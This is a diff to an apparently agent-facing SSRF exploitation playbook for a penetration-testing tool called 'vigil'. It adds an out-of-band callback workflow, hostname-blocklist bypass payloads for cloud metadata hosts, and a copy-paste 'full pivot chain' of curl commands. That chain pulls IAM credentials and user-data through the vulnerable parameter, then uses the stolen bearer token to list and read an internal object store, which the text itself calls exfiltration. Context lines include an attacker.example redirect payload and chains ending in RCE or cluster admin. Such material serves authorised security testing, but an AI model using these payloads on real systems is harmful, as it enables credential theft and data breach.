@@ -23,7 +23,7 @@ vuln_class: ssrf
 ## Tools
 
 - `curl` — manual SSRF probing and payload delivery
-- `vigil oob mint` / `vigil oob poll` — mint a nonce-tagged callback URL per probe, then correlate which probe fired (replaces eyeballing the raw listener log). Check shared readiness with `vigil oob status --json`; if no named client is running, start one with `vigil oob client start <name> --engagement <key> --agent <agent>`.
+- `vigil oob mint` / `vigil oob poll` — mint a nonce-tagged callback URL per probe (bound under a running client's interactsh id so `poll` can correlate which probe fired; replaces eyeballing the raw listener log). Check shared readiness with `vigil oob status --json` (expect `health=ok`); if no named client is running, start one with `vigil oob client start <name> --engagement <key> --agent <agent>`. `mint` auto-selects the sole running client; pass `--client <name>` when several run, and fire the exact host mint prints.
 - `vigil assess classify-payload <value> --mutations` — type the URL/host value in the suspected SSRF parameter and emit ready-made variant sets (the `escalation` bucket for a `url`-typed value is the IMDS/localhost/IPv6-loopback set; `boundary` adds `file://` and `javascript:` scheme probes)
 - Gopherus — gopher protocol payload generation for Redis, MySQL, SMTP exploitation
 
@@ -60,7 +60,7 @@ For a `url`-typed value this returns intent buckets you feed straight into Step 
 - `boundary` → `http://localhost/`, `http://127.0.0.1/`, `file:///etc/passwd`, `javascript:alert(1)` (loopback + scheme-confusion probes)
 - `format` → scheme-downgrade and quoted/embedded variants for parser-differential bypasses
 
-If the parameter instead carries a bare hostname, IP, or path, classify that value — the buckets adapt to the type. Swap the OOB host from `vigil oob mint` into each variant before firing so a blind hit is attributable.
+If the parameter instead carries a bare hostname, IP, or path, classify that value — the buckets adapt to the type. Swap the exact OOB host `vigil oob mint` prints (`$OOB_HOST` = `<nonce>.<client-id>.oob...`) into each variant before firing so a blind hit is attributable; never hand-build a bare `<nonce>.oob...` host.
 
 #### SaaS Integration Connector Pattern
 
@@ -103,20 +103,24 @@ A 4-way differential is a port-mapping primitive even when response bodies are n
 
 ### Step 2: Confirm with OOB Callback
 
-OOB callback is the fastest confirmation method. Confirm `vigil oob status --json` reports healthy shared infrastructure, then run the **mint → fire → poll** loop — do not eyeball the raw listener log.
+OOB callback is the fastest confirmation method. Confirm `vigil oob status --json` reports `health=ok` (a running, registered client must exist — `status` exits non-zero and lists issues when degraded), then run the **mint → fire → poll** loop — do not eyeball the raw listener log.
 
 ```bash
-# 1. MINT a nonce-tagged callback URL and record the correlation context
-#    (target/param/technique) in one step. Capture the http URL it prints.
-vigil oob mint --technique ssrf \
+# 1. MINT a nonce-tagged callback URL bound to your running client, and record
+#    the correlation context (target/param/technique) in one step. mint prints
+#    the full host as $OOB_HOST = <nonce>.<client-id>.researcher.example.
+vigil oob mint --client <name> --technique ssrf \
   --target-url "https://target/api/fetch" --param url \
   --probe-kind blind-confirm
+# → host  <nonce>.<client-id>.researcher.example      ← this is $OOB_HOST
 
-# 2. FIRE the payload, substituting the minted host. The unique nonce in the
-#    host is what lets poll attribute the hit back to THIS probe.
-?url=http://<nonce>.researcher.example/ssrf-confirm
+# 2. FIRE the payload, substituting the EXACT host mint printed ($OOB_HOST). mint
+#    binds the nonce under the client's interactsh id; that binding is what lets
+#    poll attribute the hit. A bare <nonce>.researcher.example would never reach
+#    poll — substitute mint's output verbatim, never hand-build the host.
+?url=http://$OOB_HOST/ssrf-confirm
 
-# 3. POLL — parse the client's interaction log and correlate probe<->callback.
+# 3. POLL the SAME client you minted under — correlate probe<->callback.
 #    Matched rows print the technique + target you minted with, so a hit is
 #    self-documenting; you never grep the listener log by hand.
 vigil oob poll --client <name>
@@ -166,6 +170,33 @@ The type determines your entire exploitation path. Classify before spending time
 ## Filter Bypass Decision Tree
 
 Not all bypasses work against all stacks. The ACTUAL URL parsing library determines what works. Test the library, not the theory.
+
+### Classify the Guard FIRST — Before Enumerating Variants
+
+Read the 403/error and decide which of three guard families you face, then pick the matching bypass branch. Spraying the wrong family is the single biggest budget sink:
+
+| Guard family | How it presents | Matching branch |
+|---|---|---|
+| **(a) IP-literal block** | rejects `http://127.0.0.1` / `169.254.169.254` but accepts a hostname | IP-encoding variants (decimal/hex/octal/IPv6/abbreviated) |
+| **(b) Resolve-then-check-private-IP** | accepts any hostname, fails only after DNS resolves to a private/link-local range | DNS rebinding (TOCTOU); IP-encoding is useless here |
+| **(c) Hostname STRING allow/block-list** | rejects the *string* `imds`/`metadata`/`localhost` (often case-sensitive); IP literals may pass | host-string bypass branch below — case/dot/percent-encoding |
+
+**If 10–15 variants of ONE family all fail identically, the family is wrong — switch families, do not deepen.** Identical failures across an encoding family mean the guard never reaches that layer; a string-blocklist will reject every IP-encoding the same way while a single case-flip on the *name* sails through.
+
+### If Hostname String Allow/Block-List (guard family c)
+
+The check matches the host *string*, but the resolver still connects the obfuscated form to the same IP. Defeat an exact/lowercase host match without changing where it resolves:
+
+```
+# Case variants — string check is case-sensitive, DNS is not
+http://IMDS./             http://Imds/             http://METADATA.internal/
+# Trailing dot — FQDN root label; resolves identically, string differs
+http://imds./             http://metadata.internal./
+# Percent-encoded host bytes — "imds" = %69%6d%64%73
+http://%69%6d%64%73/      http://%6d%65%74%61%64%61%74%61.internal/
+```
+
+For an **allowlist keyed on an approved public domain**, the approved host may itself resolve to / 30x-redirect to internal infra — submit it and let the fetcher follow the server-side redirect (see redirect-chain branch). The string check passes on the approved name; the connection lands internal.
 
 ### If Allowlist-Based (only specific domains/IPs allowed)
 
@@ -229,6 +260,16 @@ http://attacker.example/redirect?url=http://127.0.0.1/
 ```
 
 ---
+
+## Internal Topology — `localhost` Is Not "Internal"
+
+In container/compose/k8s/cloud deployments the server's own loopback reaches almost nothing: a self-SSRF to `127.0.0.1`/`localhost` hits only the app itself (and on a single-worker server can **deadlock** — the worker blocks waiting on a request it cannot serve). Internal services live on the shared internal network and answer to:
+
+- **DNS service names** — the compose/k8s service name, e.g. `store`, `objstore`, `s3`, `db`, `redis`, `api`
+- **Conventional metadata names** — `imds`, `metadata`, `metadata.internal`, `metadata.google.internal`
+- **Cloud link-local metadata IPs** — `169.254.169.254` (AWS/Azure/GCP/DO), `169.254.170.2` (ECS)
+
+So enumerate BOTH conventional internal service names AND the metadata IPs; never assume internal means loopback. The next-hop name itself is usually learned from metadata/user-data (below), not guessed.
 
 ## Cloud Metadata — What Actually Works in 2024+
 
@@ -307,6 +348,46 @@ http://169.254.169.254/metadata/v1/
 http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address
 http://169.254.169.254/metadata/v1/user-data
 ```
+
+---
+
+## Recipe: SSRF → Metadata → Internal Object/Secret Store (the full pivot chain)
+
+The most common high-value SSRF chain is multi-hop: reach metadata, steal a credential, find the NEXT host, then read its data. The skill above teaches each piece; this is the copy-pasteable sequence. Every target-facing call goes through `vigil assess kali exec --technique SSRF --intent "<purpose>" --probe-kind <kind> --phase <phase> --timeout 60 -- curl ...` — the curl bodies below show the request only; always prepend the full audit-flag set.
+
+**1. Reach metadata and pull the role/instance credential document** (`--probe-kind exploit`). This yields the token / access-key / session — but read step 2 before assuming you have the next hop:
+
+```bash
+# Through the SSRF param; AWS shown, swap per cloud (GCP/Azure/DO sections above)
+curl -s "https://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+curl -s "https://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>"
+```
+
+**2. ALWAYS enumerate the metadata tree AND read user-data / startup-script** (`--probe-kind fingerprint`). **Load-bearing insight: the credential document deliberately may NOT name the next hop. User-data / metadata attributes are the breadcrumb that does** — cloud-init / startup scripts routinely embed the internal object-store endpoint, bucket name, or DB host. (Never reading user-data is exactly what stalls a real run at ~60%: creds in hand, no idea where to spend them.)
+
+```bash
+# AWS — instance user-data (cloud-init) + the full attribute/identity tree
+curl -s "https://target/fetch?url=http://169.254.169.254/latest/user-data"
+curl -s "https://target/fetch?url=http://169.254.169.254/latest/dynamic/instance-identity/document"
+# GCP — startup-script and ALL custom attributes (Metadata-Flavor: Google required)
+curl -s "https://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/attributes/"
+curl -s "https://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script"
+# Azure — customData (base64) carries the equivalent provisioning payload
+curl -s "https://target/fetch?url=http://169.254.169.254/metadata/instance/compute/customData?api-version=2021-02-01"
+```
+
+Grep the result for an internal host/bucket: `objstore`, `s3`, `bucket`, `endpoint`, `*.internal`, `http(s)://` URLs, DB DSNs.
+
+**3. Pivot to the discovered store, FORWARDING the stolen credential in the same request** (`--probe-kind replay` to confirm reach, then `exploit` to read). Use the store's auth shape — a bearer/access header, or the importer's own credential field if the pivot is itself a fetch feature:
+
+```bash
+# LIST FIRST — discovery, not yet exfiltration. Learn the object key.
+curl -s -H "Authorization: Bearer <stolen-token>" "http://objstore.internal/buckets/<bucket>/"
+# THEN read the specific object (this is the exfil — score it on the object, not the listing)
+curl -s -H "Authorization: Bearer <stolen-token>" "http://objstore.internal/buckets/<bucket>/<key>"
+```
+
+**Confirm signal:** a store that returns 403/AccessDenied WITHOUT the credential but **lists/serves WITH it** proves both the credential is valid and the store trusts it — that differential is the chain confirmation. List → key → object: listing alone is discovery; the read of the named object is the attacker outcome you record.
 
 ---
 
@@ -470,6 +551,7 @@ If the application uses one of these, basic bypass techniques will not work. DNS
 ```
 Blind SSRF -> OOB confirm -> gopher to Redis -> webshell -> RCE
 Full SSRF -> AWS IMDSv1 -> IAM creds -> S3 bucket access -> data breach
+Full SSRF -> metadata creds + user-data names next-hop -> internal object store: list bucket -> read object (creds forwarded) -> data breach
 Full SSRF -> Kubernetes API -> service account token -> cluster admin -> all secrets
 Blind SSRF -> gopher to internal API -> POST to admin endpoint -> account takeover
 SSRF -> Docker API -> privileged container -> host root -> lateral movement
@@ -491,5 +573,5 @@ SSRF + CRLF injection -> GCP metadata with Metadata-Flavor header -> service acc
 
 ## Extended Resources
 
-- `agent/references/payloads/ssrf-payloads.md` — URL schemas, IP bypass, cloud metadata (AWS/GCP/Azure)
+- `agent/references/payloads/ssrf-payloads.md` — URL schemas, IP bypass, host-name obfuscation, conventional internal-store names, cloud metadata + user-data breadcrumb endpoints (AWS/GCP/Azure)
 - `agent/references/api-security/API07-ssrf.md` — OWASP API Security Top 10:2023 SSRF checklist
